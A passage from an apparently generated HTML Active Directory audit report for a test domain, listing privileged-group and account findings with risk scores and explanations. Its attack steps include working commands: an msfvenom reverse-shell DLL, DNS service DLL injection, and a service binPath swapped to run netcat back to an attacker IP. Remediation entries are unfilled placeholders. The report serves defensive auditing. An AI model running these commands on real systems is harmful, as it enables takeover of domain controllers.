                                        <td>Members of the DnsAdmins can exploit the DNS service on domain controllers to escalate to domain admin privileges.</td>
                                        <td>CVE-2021-40469</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>1</td></tr>
                                            <tr><td class="grey">Members</td><td>dnsadmin</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The DNS Admins group should be empty. Members of DNS Admins are permitted insert a DLL into the DNS service. When the DNS service is hosted on the Domain Controllers it runs as SYSTEM context therefore any maliciously inserted DLL could be used to take control of the domain. It should be noted that this technique was assigned CVE-2021-40469 and will not work if the October 2021 patches are applied to all domain controllers.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">Link 1</a></p>
                                            <p><a href="https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the DnsAdmins group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-1.png" alt="Checking for members of dnsadmins">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a member, an attacker can first generate a malicious reverse shell payload that will be used to provide a remote command prompt when compromising the DNS service on a domain controller.</p>
                                                    <p class="code">msfvenom -a x64 -p windows/x64/shell_reverse_rcp LHOST=10.10.10.6 LPORT=80 -f dll > exploit.dll</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-2.png" alt="Generating a payload">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. An attacker can then insert the malcious DLL into the DNS service on a domain controller.</p>
                                                    <p class="code">dmscmd.exe dc01 /config /serverlevelplugindll c:\users\moe\documents\exploit.dll</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-3.png" alt="Inserting the dll">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. Upon restarting the DNS service (dns admins have privilege to do this) the malicious DLL will be executed and return a privileged reverse shell to an attacker.</p>
                                                    <p class="code">sc.exe \\dc01 stop dns</p>
                                                    <p class="code">sc.exe \\dc01 start dns</p>
                                                    <p class="code">nc -lvnp 80</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-4.png" alt="Receiving a system shell on the domain controller">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Protected-Users-group-does-not-meet-the-benchmark-(all-privileged-users)"><u>Protected Users group does not meet the benchmark (all privileged users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>All privileged accounts should be added to the Protected Users group.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>0</td></tr>
                                            <tr><td class="grey">Members</td><td></td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Protected Users group was introduced to provide better protection from credential theft attacks for privileged accounts and should be considered within a defense-in-depth strategy. Logged in user credentials are stored in memory in the local system, where from there they are vulnerable to theft. An attacker could dump the credential memory of the system and steal password hashes of all logged in users (notably accounts of higher privileges if administrative zoning is not enforced). Members of this group have non-configurable protection applied, including the following security benefits:</p>
                                            <li>Prevents credential caching of any type (removing the ability for an attacker to dump privileged credentials from computer memory).</li>
                                            <li>Disables NTLM authentication in favour of Kerberos. This means accounts will use the stronger Kerberosv5 protocol for authentication.</li>
                                            <li>Reduce Kerberos ticket lifetime to reduce persistent access (no renewal of TGT beyond 4-hour lifetime).</li>
                                            <li>Enforces usage of strong encryption algorithms such as AES - meaning cracking user password hashes will take significantly longer.</li>
                                            <li>Prevents any type of Kerberos delegation.</li>
                                            <p>All privileged accounts (domain admins & administrators) should be protected from attackers as much as possible and adding them to the protected users group is an effective way to secure them.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#protected-users">Link 1</a></p>
                                            <p><a href="https://blog.netwrix.com/2015/02/20/add-sensitive-user-accounts-to-active-directory-protected-users-group/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. All privileged accounts should be a member of the Protected Users group in ActiveDirectory.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/protecteduser-1.png" alt="Checking for members of protected users">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a user is not a member of this group and logs into a computer, their credentials will remain in memory until the computer is restarted. This means they are available for theft from an attacker.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/protecteduser-2.png" alt="Logging in interactively">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. Using tools like mimikatz, attackers with system access can extract credentials from memory and then impersonate the users that have logged into the system to move laterally and escalate privileges. If a domain admins credentials are stolen from a system they have logged into, the domain has been fully compromised.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/protecteduser-3.png" alt="Dumping cached credentials">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Add all privilged users</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Server-Operators-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Server Operators group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Server Operators group can indirectly compromise the domain by administering domain controllers.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>2</td></tr>
                                            <tr><td class="grey">Members</td><td>serveroperator ASREPuser</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Server Operators group should be empty as they can administer domain controllers. Server Operators can take indirect control of the domain because they have write access to critical domain resources having permission to stop, replace and start system services on domain controllers. An attacker could login to a domain controller, replace a service with a malicious binary and restart the service to executive the binary in SYSTEM context, fully compromising the domain. Best practice is to keep the group empty in favour of a custom role-based group giving only the privileges required.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Server Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/serveroperator-1.png" alt="Checking for members of server operators">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a member, an attacker can change the configuration of a service running as SYSTEM with a malicious file and restart the service to execute the malicious file within SYSTEM context.</p>
                                                    <p class="code">services</p>
                                                    <p class="code">sc.exe config VMTools binPath="C:\windows\tasks\nc64.exe -e cmd.exe 192.168.10.130 443"</p>
                                                    <p class="code">sc.exe stop VMTools</p>
                                                    <p class="code">sc.exe start VMTools</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/serveroperator-2.png" alt="Replacing a service and restarting it">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. This will return a privileged reverse shell on the domain controllerto an attacker.</p>
                                                    <p class="code">nc -lvnp 443</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/serveroperator-3.png" alt="Receiving a reverse shell on a domain controller">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Highly-privileged-account-does-not-have-the-'Account-is-sensitive-and-cannot-be-delegated'-flag-set"><u>Highly privileged account does not have the 'Account is sensitive and cannot be delegated' flag set</u></td>
                    <td class="finding-riskMEDIUM">MEDIUM</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>All privileged accounts should be protected from impersonation from attackers.</td>
                                        <td>T.134533</td>
                                        <td>+19</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Users</td><td>accountoperator<br>Administrator<br>ASREPuser<br>backupoperator<br>dnsadmin<br>domainadmin1<br>enterpriseadmin1<br>enterpriseadmin2<br>gpoACL<br>jack<br>printoperator<br>rdpuser<br>serveroperator</td></tr>
                                            <tr><td class="grey">Account cannot be delegated</td><td>False</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Privileged accounts are defined as users that have admin privileges, for example domain admins / administrators.</p>
                                            <p>13 privileged users do not have the 'Account is sensitive and cannot be delegated' flag set. Enabling this on all administrative accounts ensures their credentials cannot forwarded to other computers or services on the network by a trusted application. This prevents account impersonation by a malicious threat actor meaning attacks such as constrained delegation will fail.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts">Link 1</a></p>
                                            <p><a href="https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-access-tokens/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. All privileged accounts should have the account is sensitive and cannot be delegated flag set within Active Directory. This will mean that when impersonating privileged for example in constrained delegation, the attack will simply fail showing how important this is to implement.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/sensitiveaccount-1.png" alt="Checking for sensitive accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Add all privilged users</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>    <tr>
        <td class="toggle" id="Suspicious-/-legacy-admin-account"><u>Suspicious / legacy admin account</u></td>
        <td class="finding-riskMEDIUM">MEDIUM</td>
    </tr>
    <tr class="finding">
        <td colspan="3">
            <div class="finding-info">
                <table>
                    <tbody>
                        <tr>
                            <th>Issue</th>
                            <th>MITRE ATT&CK ref</th>
                            <th>Score</th>
                        </tr>
                        <tr>
                            <td>User has the adminCount attribute set to 1 but is not a member of privileged groups.</td>
                            <td>T-15940</td>
                            <td>+15</td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <tbody>
                        <tr>
                            <th>Relevant info</th>
                            <th>Issue explanation</th>
                        </tr>
                        <tr>
                            <td class="relevantinfo"><table>
                                <tr><td class="grey">Users</td><td>adminCount<br>DANNIE_HEATH</td></tr>
                                <tr><td class="grey">adminCount</td><td>1</td></tr>
                            </table></td>
                            <td class="explanation">
                                <p>Any user account that is added to default privileged groups in active directory (account operators, domain admins, etc) is assigned an adminCount property of 1. This is done to ensure members of protected groups have standardized and controlled security descriptors, as every 60 minutes Active Directory will take the ACL's of the AdminSDHolder and apply it to the protected users and groups with AdminCount set to 1, to ensure they have no rogue ACLs set and remain protected. If accounts have the adminCount set to 1 but are not a member of default privileged groups this is suspicious and may indicate an attacker has applied their own ACL's to AdminSDHolder and have waited for them to propogate in order to achieve persistence over these accounts.</p>
                                <p>2 users have the admincount attribute set to 1 but is not a member of default privileged groups. These users may provide an attacker persistent access and have unaudited high privileges..</p>
                                <p class="links"><b>Further information:</b></p>
                                <p><a href="https://blog.netwrix.com/2022/09/30/admincount_attribute/">Link 1</a></p>
                                <p><a href="https://specopssoft.com/support/en/password-reset/understanding-privileged-accounts-and-adminsdholder.htm">Link 2</a></p>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <tbody>
                        <tr>
                            <th>Attack explanation</th>
                        </tr>
                        <tr>
                            <td>
                                <div class="attack-container">
                                    <div class="attack-text">
                                        <p>1. Any low-privileged user can enumerate users with the adminCount property set to 1, which gives a list of privileged accounts with ACLs controlled via the AdminSDHolder. Any account not a member of default privileged groups should be investigated.</p>
                                        <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --admin-count</p>
                                    </div>
                                    <span class="image-cell">
                                        <img src="/Private/Report/Images/RBAC/adminsdholder-1.png" alt="Finding users with adminCount set to 1">
                                    </span>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <tbody>
                        <tr>
                            <th>Remediation (GPT to contextualize)</th>
                        </tr>
                        <tr>
                            <td>
                                <p>Remove adminCount from unprivileged users</p>
                                <p>run command 1</p>
                                <p>run command 2</p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </td>
    </tr>                <tr>
                    <td class="toggle" id="Inactive/stale-accounts-are-not-disabled"><u>Inactive/stale accounts are not disabled</u></td>
                    <td class="finding-riskLOW">LOW</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Accounts that have not logged on in the last 90 days are not disabled.</td>
                                        <td>T-15940</td>
                                        <td>+5</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>                                    <tr><td class="grey">Total inactive</td><td>421</td></tr>
                                    <tr><td class="grey">Users</td><td>enterpriseadmin1<br>enterpriseadmin2<br>domainadmin1<br>adminCount<br>THERON_DUNCAN<br>BERNICE_POLLARD<br>CLAUDINE_ASHLEY<br>KRISTINE_AVERY<br>RICK_MARTINEZ<br>DENIS_MCCLAIN<br>NATHAN_WALSH<br>GREGG_CONLEY<br>SALVATORE_HOWELL<br>KATRINA_RAMOS<br>ANASTASIA_MCCARTY<br>CORRINE_STEPHENSON<br>ALINE_JACOBSON<br>JEANNIE_ESTES<br>LISA_DONOVAN<br>MILLICENT_HERRING<br>MAURICIO_WALSH<br>VAN_WITT<br>WANDA_WILLIAM<br>REYES_MULLINS<br>AUBREY_CLARK<br>MILTON_BUCKLEY<br>MARGRET_ENGLISH<br>BRANT_MCCALL<br>DARREL_BARTLETT<br>HELEN_HORNE<br>SABRINA_CONNER<br>FRAN_FRANCO<br>DORTHY_CHAPMAN<br>TERRENCE_SHAFFER<br>ALFONZO_SARGENT<br>KATHIE_CARTER<br>GRETA_WEBSTER<br>LAUREL_CLARK<br>CAROL_MILES<br>LETICIA_VINSON<br>JED_AVERY<br>TAMIKA_BUCK<br>LEVI_RIOS<br>MELBA_VALENCIA<br>BESSIE_MCINTOSH<br>CHERI_DODSON<br>LILLIE_FITZPATRICK<br>GLEN_STRICKLAND<br>JOSHUA_LOGAN<br>ALBERTO_POPE<br>DIANA_PEREZ<br>REID_DEJESUS<br>ROSALINDA_ACOSTA<br>SAMMY_SALINAS<br>LANNY_DAUGHERTY<br>KRISTIE_SIMMONS<br>9909368922SA<br>EULA_COFFEY<br>DENVER_CHURCH<br>ROCKY_MCGUIRE<br>KASEY_PACE<br>OLLIE_CHEN<br>RAMIRO_WALLER<br>CASANDRA_BERRY<br>RUSSELL_TALLEY<br>EDDIE_BLANCHARD<br>CALVIN_RAY<br>ADRIAN_DOMINGUEZ<br>ELI_DRAKE<br>TERRENCE_CLEMENTS<br>KENT_WOODWARD<br>WILMER_HUNT<br>VICKI_SYKES<br>MARTINA_BRUCE<br>MELANIE_MANNING<br>BETHANY_WHITEHEAD<br>KARL_PUGH<br>PERCY_CLEMONS<br>HANNAH_MCKINNEY<br>MARIANA_JACOBS<br>THAD_DAVENPORT<br>MARGARITA_MCKINNEY<br>WILMER_DAWSON<br>TANNER_CARPENTER<br>EMIL_SCHROEDER<br>CHARLENE_FINLEY<br>CHASE_RATLIFF<br>AMPARO_DOTSON<br>BERNIE_BELL<br>SALVADOR_CONRAD<br>CHRISTOPER_MONTGOMER<br>AUGUSTINE_NICHOLS<br>LENA_MATHIS<br>WYATT_LANDRY<br>JENIFER_NELSON<br>ELI_LINDSAY<br>MAURICIO_MERRILL<br>LEANNE_JOHNSTON<br>CASSANDRA_CROSBY<br>CLARENCE_BURCH<br>JULIET_TYSON<br>KIETH_CHURCH<br>BILLY_BURTON<br>CYRUS_PHELPS<br>MELVIN_TYLER<br>YOUNG_MIRANDA<br>9665093243SA<br>LORAINE_CASTANEDA<br>WENDI_SKINNER<br>CELIA_RAMIREZ<br>LUKE_MULLINS<br>LANE_WILLIAM<br>LIZ_BARRETT<br>LAKEISHA_AGUILAR<br>MARILYN_BOOKER<br>CHRISTOPHER_MATHIS<br>MANDY_BOOKER<br>DARRYL_ACEVEDO<br>VICENTE_WATKINS<br>CHUCK_GATES<br>SONIA_HOWELL<br>PATTI_FRY<br>TRACEY_HANSON<br>CONCETTA_KNOX<br>ARNULFO_WILKINS<br>BOOKER_FAULKNER<br>HARLAN_SHARPE<br>PRISCILLA_MELENDEZ<br>JOEL_CURTIS<br>LOWELL_DAVENPORT<br>DELORIS_ROACH<br>ADELINE_MCCULLOUGH<br>ANNIE_WADE<br>JIMMY_LE<br>WINIFRED_MCDONALD<br>MONIQUE_DAUGHERTY<br>DERRICK_HENDERSON<br>IMOGENE_MCKEE<br>LORENZO_MEDINA<br>MIA_JOHNS<br>SEAN_PATEL<br>YOUNG_MILES<br>MELVIN_FINLEY<br>LEE_WALLACE<br>KATHRINE_STAFFORD<br>LIZ_BUCKNER<br>BOBBI_RODGERS<br>JOHNNY_COOLEY<br>KENTON_RUIZ<br>ESTELA_HUGHES<br>MARISOL_HAMPTON<br>DAWN_LEWIS<br>HILLARY_TRAVIS<br>NORBERTO_BARNETT<br>JERROLD_KELLY<br>HELENA_PADILLA<br>AUDRA_CLARKE<br>ROSEMARY_ATKINSON<br>3360697118SA<br>TERESA_MCFARLAND<br>ELVIRA_MATHEWS<br>OLIN_GALLOWAY<br>MARC_BALLARD<br>VICTORIA_LYNN<br>MARCI_BULLOCK<br>MELISA_FOLEY<br>THEODORE_ROLLINS<br>TRENTON_WEAVER<br>CLARK_BALL<br>MICAH_OCONNOR<br>BEULAH_HOLDER<br>ELOY_VAUGHN<br>JEREMY_HEBERT<br>LUANN_STANTON<br>DUNCAN_DORSEY<br>WILFORD_GAINES<br>LAUREN_SAVAGE<br>SHAWNA_CHAVEZ<br>CARLY_PECK<br>KRISTA_MADDEN<br>BRIDGETTE_BYERS<br>LULA_MITCHELL<br>DONOVAN_HODGE<br>KERI_MCKENZIE<br>FERN_PACHECO<br>CARY_BROCK<br>TRACEY_FRY<br>DEWAYNE_HOLLAND<br>MARGARITO_HYDE<br>JACQUELYN_BLACK<br>LUPE_WYNN<br>JED_LUNA<br>TRACEY_CONLEY<br>ARNOLD_PATTERSON<br>MARGARITA_CANTU<br>EMIL_CLAY<br>RIGOBERTO_GALLEGOS<br>MURRAY_CHRISTIAN<br>LOUIE_RICHMOND<br>SAM_WILSON<br>NOEL_FIGUEROA<br>MURIEL_VELASQUEZ<br>COLIN_STEWART<br>PANSY_WARNER<br>DEWITT_WILCOX<br>JANINE_HOLDEN<br>RAFAEL_WOODWARD<br>VINCENT_KIDD<br>QUEEN_WOLF<br>LILLIAN_DOMINGUEZ<br>DAMIEN_CARNEY<br>LEANNA_MCGUIRE<br>KARLA_FROST<br>RITA_MOONEY<br>JODY_MCINTOSH<br>ETHAN_CRANE<br>AMBER_FRANCIS<br>ORA_LANE<br>LAKEISHA_YORK<br>JACKSON_MIRANDA<br>JOEY_ABBOTT<br>AHMAD_BRAY<br>JESSIE_SWANSON<br>DARREN_ALVARADO<br>CLIFTON_BERNARD<br>EARNESTINE_RODGERS<br>STANLEY_GRIMES<br>KELLY_SINGLETON<br>LULA_BARNES<br>BRANT_PARRISH<br>BUFORD_BOWERS<br>CONNIE_RICH<br>CONCETTA_BRITT<br>BRIANNA_VANCE<br>ROSEMARY_PATEL<br>DARLA_COHEN<br>CAROLINE_POOLE<br>8494148715SA<br>STEWART_THORNTON<br>GRANT_DAVID<br>ERIKA_CLEMONS<br>KATHARINE_CONRAD<br>NATASHA_HANCOCK<br>DOMINGO_SHARP<br>OCTAVIO_BIRD<br>CECILE_BOWERS<br>EMILE_HERRERA<br>JANICE_SHEPARD<br>NITA_WILDER<br>7734263089SA<br>KIM_MAY<br>TED_ALLEN<br>LENARD_ARMSTRONG<br>ADOLPH_OLSON<br>KATRINA_MCGOWAN<br>EARNEST_BISHOP<br>DAMON_WALLER<br>ALEXANDRIA_HEBERT<br>GRADY_COCHRAN<br>MINERVA_POOLE<br>SUSANNA_KELLER<br>MICHELE_GOULD<br>CINDY_SNYDER<br>TONIA_BAXTER<br>COLLEEN_TERRY<br>REBEKAH_WORKMAN<br>9105674591SA<br>IRWIN_GILLESPIE<br>BERNADETTE_BARRERA<br>BRADFORD_KLEIN<br>OLGA_FLYNN<br>CAROL_GRIFFIN<br>RHONDA_LAMB<br>NAPOLEON_MOORE<br>COLBY_MONTOYA<br>DAMON_FARLEY<br>ISABELLE_ESTRADA<br>JAMES_COLLINS<br>MEGHAN_HENSLEY<br>WALLACE_KRAMER<br>BECKY_MOLINA<br>EMILIO_GRAHAM<br>GERARDO_VAZQUEZ<br>LIZZIE_MOONEY<br>ROSS_HEBERT<br>ANTONIA_ROSS<br>DANE_STEPHENSON<br>CYRIL_DILLARD<br>DEIRDRE_MEYERS<br>ISAIAH_CARR<br>DONNA_MCCULLOUGH<br>EVELYN_LEVINE<br>JACKIE_BENTLEY<br>MORGAN_SOTO<br>DONNIE_RANDOLPH<br>2349155901SA<br>CRAIG_DODSON<br>NANCY_MADDEN<br>MAVIS_LARSEN<br>LOIS_PRICE<br>DAMON_MURPHY<br>ALBA_BENSON<br>ARIEL_BRIDGES<br>JOHNIE_DUKE<br>STACY_HARPER<br>1442814032SA<br>MARCOS_KEY<br>CHRISTIAN_MILLS<br>COURTNEY_MCCRAY<br>LYNDA_EVERETT<br>TAMIKA_MCCLAIN<br>MARIO_SHANNON<br>RICKEY_ODONNELL<br>JULIAN_PRUITT<br>WALKER_HAMPTON<br>SUE_SUMMERS<br>EDDIE_KELLEY<br>KEVEN_BENNETT<br>KEISHA_HARMON<br>THELMA_RILEY<br>CLAIRE_CHRISTIAN<br>LUISA_DODSON<br>TRACEY_FINCH<br>JOSEF_VALENZUELA<br>SONYA_DUNN<br>EDWARD_CAREY<br>JARRED_BOOKER<br>2229323318SA<br>TONIA_FRANCO<br>KELLY_WAGNER<br>DEVIN_PAUL<br>ANNMARIE_WIGGINS<br>ANNE_GRIMES<br>GEORGINA_ELLIOTT<br>EMANUEL_CARRILLO<br>OFELIA_HUBER<br>RICO_MCMAHON<br>CLAIRE_MCCRAY<br>DELMER_MERRILL<br>ROLAND_VALENTINE<br>STACI_DOMINGUEZ<br>PRINCE_LOPEZ<br>ALLEN_DICKSON<br>SOLOMON_WALTERS<br>FLOYD_HEWITT<br>ROSEANN_BLACKWELL<br>ERIC_SNIDER<br>TRENT_FRANCIS<br>AUGUSTUS_MEYER<br>KRIS_BARNES<br>ELIZABETH_BARLOW<br>CHERYL_PRESTON<br>REBEKAH_PACHECO<br>SHEREE_BAXTER<br>JANA_LUCAS<br>ANGELICA_HART<br>KENTON_HORNE<br>AVIS_TRUJILLO<br>2891488045SA<br>MICHAEL_RODRIQUEZ<br>PATRICIA_BELL<br>KELSEY_DURHAM<br>ROLAND_BOWMAN<br>MARCUS_HERRING<br>VAN_MATHEWS<br>JEFFERY_WEBER<br>HERSHEL_HOLT<br>SYLVESTER_GUTIERREZ<br>FRANCIS_VINCENT<br>STEFANIE_PARK<br>REBEKAH_CONTRERAS<br>MIRANDA_CALDERON<br>EDMUND_JOHNSON<br>KRISTINA_GLENN<br>CHARLES_CALLAHAN<br>IVA_CRAFT<br>SAMUEL_RICHARDS<br>COURTNEY_CARSON<br>SHIRLEY_HEBERT<br>THEODORE_LEE<br>MOLLY_EATON<br>SAMMY_BRIGGS<br>JOSH_AVERY<br>CONSUELO_WADE<br>OTIS_WAGNER<br>ANDRES_MAYNARD<br>DEWITT_SHEPHERD<br>WILBUR_GILMORE<br>MICHEL_FLYNN<br>LAWRENCE_JONES<br>ANDERSON_JOHNS<br>6488038049SA<br>ARACELI_GRAHAM<br>TERRI_AUSTIN<br>ETHAN_LYNN<br>OLGA_GREGORY<br>YVETTE_MACDONALD<br>9541657019SA<br>ALBERTO_BLAKE<br>IRENE_CHAPMAN<br>DANNIE_HEATH<br>ELLA_PACHECO<br>ANTONY_BIRD<br>ADRIAN_MCFADDEN<br>JON_SIMS<br>RAMIRO_LEBLANC<br>TRISHA_WOLFE<br>FRANK_RICHARD<br>HOLLIE_LLOYD<br>CLIFF_HART<br>KRIS_NOEL<br>JOHN_MERCADO<br>ERMA_HARRINGTON<br>ENID_KLEIN<br>BRENDAN_FLORES<br>ROSCOE_BRIGGS<br>CHRISTI_WATERS<br>KATHRYN_BURRIS<br>KRISTINA_CARR<br>MOHAMMAD_JIMENEZ<br>MOHAMMAD_WILSON</td></tr>
                                    <tr><td class="grey">Enabled</td><td>True</td></tr>
                                    <tr><td class="grey">Inactivity period</td><td>90 days</td></tr>                                        </table></td>
                                        <td class="explanation">
                                            <p>Stale user accounts are a significant security issue, as former employees and external attackers could use those accounts to attack the organization. Good cyber security practice guides us to follow the principal of least privilege: if an account is not used, the account should be disabled or removed from privileged groups if it not required.</p>
                                            <p>The are 421 inactive accounts found in test.local. A JML process should be enforced that disables accounts not used after a period of inactivity to prevent unauthorised use and conform to principle of least privilege.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/services-hub/unified/health/remediation-steps-ad/regularly-check-for-and-remove-inactive-user-accounts-in-active-directory">Link 1</a></p>
                                            <p><a href="https://www.lepide.com/blog/how-ad-inactive-accounts-harm-security/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
